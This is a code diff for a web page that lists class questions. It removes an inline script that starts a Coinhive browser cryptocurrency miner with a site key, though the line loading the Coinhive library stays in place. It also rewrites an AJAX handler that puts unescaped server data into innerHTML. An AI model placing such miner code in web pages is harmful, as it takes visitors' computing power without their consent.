@@ -59,9 +59,7 @@
     <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
     <link rel="stylesheet" href="css/pages.css">
     <script>
-      //Start miner
-	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
-	      miner.start();
+      var feed = 0;
 
       //Script to get question
 
@@ -87,11 +85,16 @@
                  dataType: "json",
                  data: {class: $_GET['class']},
                  success: function(data){
-                   var div = document.createElement("div");
-                   div.setAttribute('class', 'row');
-                   div.setAttribute('order', data['creation']);
-                   div.innerHTML = "<div class=\"col-md-12\"><div class=\"jumbotron well\">" + data['ID'] + data['class_name'] + "</div></div>";
-                   document.getElementById('questions').appendChild(div);
+                   var counter = 0;
+                   while(data[counter]) {
+                     var div = document.createElement("div");
+                     div.setAttribute('class', 'row');
+                     div.setAttribute('id', data[counter]);
+                     feed = data[counter];
+                     div.innerHTML = "<div class=\"col-md-12\"><div class=\"jumbotron well\">" + data[counter + 1] + ": " + data[counter + 2] + "</div></div>";
+                     counter += 3;
+                     document.getElementById('questions').appendChild(div);
+                   }
                  },
                  error: function() {
                    alert("Error.");
